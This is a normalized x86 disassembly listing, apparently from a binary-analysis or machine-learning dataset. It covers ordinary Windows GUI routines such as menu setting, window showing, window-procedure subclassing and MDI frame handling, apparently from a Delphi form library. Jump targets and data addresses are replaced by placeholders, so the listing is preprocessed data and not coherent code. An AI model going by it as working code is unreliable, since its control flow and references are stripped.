xor ecx ecx
mov edx 0xf
mov eax ebx
call sub_451b4c
push 0x0
mov eax ebx
call sub_4585f8
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4585f8
mov edx eax
mov eax esi
call sub_4382c8
jmp r-xdata
mov eax [ ebx + 0x290 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4585f8
push eax
call SetMenu
sub_43fba0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43fb38
cmp ebx eax
je r-xdata
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
cmp ebx 0x24
jl r-xdata
mov eax [ esi + 0x2a4 ]
cmp [ eax ] 0x0
setne al
mov al 0x1
jmp r-xdata
mov eax [ esi + 0x2a4 ]
mov [ eax ] ebx
test al al
je r-xdata
sub_43fbfc
push ebx
mov ebx eax
cmp dl [ ebx + 0x330 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x330 ] dl
cmp dl 0x1
jne r-xdata
xor eax eax
mov [ ebx + 0x340 ] eax
xor eax eax
mov [ ebx + 0x344 ] eax
mov eax ebx
call sub_458904
test al al
je r-xdata
cmp [ ebx + 0x334 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_43fc50
mov eax ebx
call sub_454ff0
sub_43fc50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x334 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x334 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_4202d8
xor eax eax
mov [ ebx + 0x340 ] eax
xor eax eax
mov [ ebx + 0x344 ] eax
mov eax ebx
call sub_458904
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_420098
mov [ ebx + 0x330 ] 0x2
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_454ff0
sub_43fcc0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43fcb0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x2a4 ]
xor edx edx
mov [ eax ] edx
test bl bl
je r-xdata
mov eax [ esi + 0x2a4 ]
mov edx [ rw-data ]
mov edx [ edx + 0x40 ]
mov [ eax ] edx
sub_43fd30
push ebx
mov ebx eax
mov eax ebx
call sub_457be0
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_43fd18
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_43fd18
mov edx eax
mov eax ebx
call sub_450a08
mov edx 0xff00000f
mov eax ebx
call sub_450a08
pop ebx
retn
sub_43fdb4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x273 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x273 ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1da ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4585f8
push eax
call ShowWindow
sub_43fdf4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx + 0x279 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
movzx eax [ ebx + 0x279 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f5f4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_43f5f4
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_443dd4
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
call sub_444cd0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_43f5f4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_443dd4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
movzx eax [ ebx + 0x278 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_443dc0
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443aa0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443a84
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443a6c
mov ebp eax
mov eax ebx
call sub_43df9c
add ebp eax
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_443dc0
call sub_443a6c
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443a6c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443ab8
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443aa0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443a84
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443a6c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443ab8
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443aa0
push eax
mov eax ebx
call sub_43dfbc
pop edx
add edx eax
push edx
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_443dc0
call sub_443aa0
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443aa0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443a84
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443a6c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443ab8
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443a6c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443ab8
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x88 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x88 ]
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443aa0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_443dc0
call sub_443a84
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x88 ]
jmp r-xdata
adc eax 0x0
sub_440158
push ebx
push esi
mov esi eax
push esi
call GetParent
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
and eax 0x80
cmp eax 0x80
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov ebx [ eax + 0x44 ]
test ebx ebx
je r-xdata
push esi
call GetParent
mov ebx eax
mov eax [ rw-data ]
mov ebx [ eax + 0x30 ]
push 0xffffffec
mov eax ebx
call sub_4585f8
push eax
call GetWindowLongA
test al 0x80
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4585f8
mov ebx eax
jmp r-xdata
sub_4401c8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43ca74
mov edx edi
mov eax ebx
call sub_443584
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov [ edi + 0x24 ] 0x8
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x1c4 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
xor esi esi
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx eax [ ebx + 0x278 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
or [ edi + 0x4 ] 0xcf0000
jmp r-xdata
test [ ebx + 0x358 ] 0x8
je r-xdata
mov al 0x2
jmp r-xdata
lea eax [ edi + 0x24 ]
push eax
lea ecx [ edi + 0x8 ]
lea edx [ edi + 0x4 ]
mov eax ebx
mov si 0xffa9
call sub_40484c
movzx eax [ ebx + 0x271 ]
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov [ edi + 0xc ] 0x80000000
mov [ edi + 0x10 ] 0x80000000
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x0
jne r-xdata
cmp [ ebx + 0x330 ] 0x0
jne r-xdata
mov ebp [ ebx + 0x340 ]
test ebp ebp
jne r-xdata
mov edx eax
sub dl 0x2
je r-xdata
mov edx eax
test dl dl
je r-xdata
xor eax eax
movzx eax [ ebx + 0x330 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebx + 0x344 ]
test eax eax
je r-xdata
cmp [ ebx + 0x344 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
sub dl 0x3
jne r-xdata
mov al 0x2
sub dl 0x3
jne r-xdata
mov esi ebp
mov eax ebp
call sub_4585f8
mov [ edi + 0x1c ] eax
mov [ edi + 0x1c ] eax
jmp r-xdata
sub al 0x1
jb r-xdata
movzx edx [ ebx + 0x278 ]
sub dl 0x1
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
sub al 0x3
jae r-xdata
mov eax [ edi + 0x1c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
je r-xdata
mov eax esi
call sub_43fb50
mov edx ebx
call sub_4198f4
test eax eax
jge r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
call sub_44821c
test al al
je r-xdata
je r-xdata
mov [ edi + 0x14 ] 0x80000000
mov [ edi + 0x18 ] 0x80000000
sub dl 0x2
jne r-xdata
mov [ ebx + 0x273 ] 0x0
test [ ebx + 0x1c ] 0x10
jne r-xdata
and [ edi + 0x4 ] 0xbffcffff
mov [ ebx + 0x344 ] eax
mov edx esi
mov eax ebx
call sub_420098
mov [ ebx + 0x340 ] esi
jmp r-xdata
mov eax esi
call sub_43fb50
mov edx ebx
call sub_419740
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_447be4
mov [ edi + 0x1c ] eax
cmp [ edi + 0x1c ] 0x0
je r-xdata
dec al
je r-xdata
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff3fffff
test [ ebx + 0x1d ] 0x2
je r-xdata
movzx eax [ ebx + 0x273 ]
cmp al 0x1
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_458904
test al al
je r-xdata
mov ebp [ edi + 0x1c ]
test ebp ebp
je r-xdata
mov eax [ edi + 0x1c ]
call sub_43b75c
test eax eax
jne r-xdata
mov ebp [ ebx + 0x334 ]
test ebp ebp
je r-xdata
jmp r-xdata
lea ecx [ edi + 0x8 ]
lea edx [ edi + 0x4 ]
mov eax ebx
mov si 0xffaa
call sub_40484c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax r-xdata
mov [ edi + 0x28 ] eax
cmp al 0x2
jne r-xdata
or [ edi + 0x4 ] 0x20000000
jmp r-xdata
mov eax [ rw-data ]
call sub_447c2c
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push 0xffffffec
push ebp
call GetWindowLongA
and eax 0x80
cmp eax 0x80
jne r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
mov eax [ edi + 0x1c ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_447c2c
mov [ edi + 0x1c ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x277 ] 0x1
je r-xdata
test [ ebx + 0x55 ] 0x20
je r-xdata
or [ edi + 0x4 ] 0x1000000
jmp r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov eax [ edi + 0x1c ]
call sub_440158
mov [ edi + 0x1c ] eax
mov eax [ edi + 0x1c ]
push eax
call IsWindowEnabled
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
mov eax ebp
call sub_4585f8
mov [ edi + 0x1c ] eax
mov esi [ ebx + 0x334 ]
jmp r-xdata
mov eax [ rw-data ]
call sub_44821c
test al al
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp eax [ edx + 0x1b4 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x44 ]
cmp eax [ edx + 0x1b4 ]
jne r-xdata
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax [ rw-data ]
call sub_44821c
test al al
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x6c ]
jmp r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
jmp r-xdata
or [ edi + 0x8 ] 0x40000
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_458904
test al al
je r-xdata
mov eax [ rw-data ]
call sub_447c2c
mov [ edi + 0x1c ] eax
jmp r-xdata
sub_4405b4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_43ca84
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x271 ] 0x3
je r-xdata
mov eax [ ebx + 0x338 ]
test eax eax
je r-xdata
movzx eax [ ebx + 0x277 ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4585f8
push eax
call SendMessageA
mov eax ebx
call sub_441144
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4585f8
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebx + 0x33c ]
call sub_406774
mov edi eax
test edi edi
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x2a0 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x0
lea eax [ ebx + 0x33c ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
test [ ebx + 0x1c ] 0x1
jne r-xdata
inc edi
xor esi esi
mov eax [ ebx + 0x338 ]
mov edx [ eax ]
call [ edx + 0x8 ]
inc edi
xor esi esi
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_450210
push eax
mov eax ebx
call sub_450254
push eax
mov eax ebx
call sub_4585f8
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_40857c
mov [ ebx + 0x29c ] eax
push ebx
push sub_43ec18
call sub_421084
mov [ ebx + 0x2c0 ] eax
push 0xfffffffc
mov eax [ ebx + 0x29c ]
push eax
call GetWindowLongA
mov [ ebx + 0x2bc ] eax
mov eax [ ebx + 0x2c0 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x29c ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_434a54
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4585f8
push eax
call SetWindowPos
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_447e3c
call sub_448128
test al al
je r-xdata
mov eax [ ebx + 0x1b4 ]
push eax
mov eax [ ebx + 0x33c ]
mov eax [ eax + esi * 8 ]
push eax
push 0xb049
mov eax [ ebx + 0x33c ]
mov eax [ eax + esi * 8 + 0x4 ]
push eax
call SendMessageA
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x338 ]
call sub_419898
call sub_4551b8
inc esi
dec edi
jne r-xdata
xor edx edx
mov eax ebx
call sub_447ef0
sub_4407a6
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4408d1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_454b04
and [ ebx + 0x358 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
cmp [ eax + 0x29c ] 0x0
jne r-xdata
mov eax ebx
call sub_443430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4408d8
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
mov [ ebx + 0x1b4 ] eax
or [ ebx + 0x358 ] 0x10
jmp r-xdata
sub_4408e0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_44d2f4
test eax eax
jne r-xdata
push 0x4
push ebx
call GetWindow
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call SendMessageA
sub_440924
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454f7c
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
setne al
mov [ ebp - 0xc ] al
lea eax [ ebp - 0x10 ]
push eax
push sub_4408e0
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
xor eax eax
push ebp
push sub_4409dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_419898
mov edx [ eax ]
call [ edx + 0xb0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_419898
mov dl 0x1
call sub_459998
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_419898
xor edx edx
call sub_459998
sub_440a28
push ebx
mov ebx eax
test [ ebx + 0x358 ] 0x10
je r-xdata
mov eax ebx
call sub_454d80
push 0x0
mov eax ebx
call sub_4585f8
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x29c ] eax
pop ebx
retn
sub_440a6c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x29c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_455c14
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x29c ]
push eax
mov eax ebx
call sub_4585f8
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4585f8
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_440ad0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440b80
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x268 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b87
lea eax [ ebp - 0x4 ]
call sub_405530
retn
test edi edi
je r-xdata
mov [ ebx + 0x268 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x276 ] 0x0
je r-xdata
cmp ebx edi
je r-xdata
mov eax ebx
mov si 0xffaf
call sub_40484c
mov eax ebx
call sub_440ea4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
mov dl 0x1
mov eax edi
call sub_43bd4c
cmp ebx eax
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb6
call sub_40484c
test al al
jne r-xdata
sub_440b90
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x268 ]
mov eax esi
call sub_454450
test al al
je r-xdata
mov edx [ edi + 0x26c ]
mov eax esi
call sub_454450
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_440ad0
mov eax [ esi + 0x30 ]
mov [ edi + 0x26c ] eax
sub_440bd8
push ebx
push esi
mov esi eax
movzx ebx [ esi + 0x276 ]
mov eax esi
call sub_440ad0
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
sub_440bfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x5 ] 0x0
inc [ rw-data ]
cmp [ edi + 0x298 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4199dc
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_419914
mov eax edi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4199dc
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_419914
jmp r-xdata
xor eax eax
mov [ edi + 0x268 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x268 ] eax
jmp r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_440e79
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x26c ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x26c ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x26c ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4585f8
mov dx 0xb000
call sub_43babc
test al al
jne r-xdata
call sub_4585f8
mov ebx eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax ebx
call sub_43babc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440e80
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_404f70
jmp r-xdata
call sub_404f70
jmp r-xdata
mov esi [ edi + 0x26c ]
test esi esi
je r-xdata
mov eax [ edi + 0x26c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_454450
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ edi + 0x26c ]
call sub_4585f8
mov ebx eax
mov eax [ edi + 0x26c ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x26c ] eax
mov dx 0xb01b
mov eax ebx
call sub_43babc
test al al
jne r-xdata
jmp r-xdata
mov ebx [ esi + 0x30 ]
cmp ebx [ edi + 0x26c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_451b4c
mov eax [ edi + 0x2c4 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
call sub_404f70
jmp r-xdata
mov esi ebx
mov [ edi + 0x26c ] esi
mov eax esi
call sub_4585f8
mov dx 0xb01a
call sub_43babc
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
call sub_404f70
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_451b4c
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
sub_440ea4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x268 ]
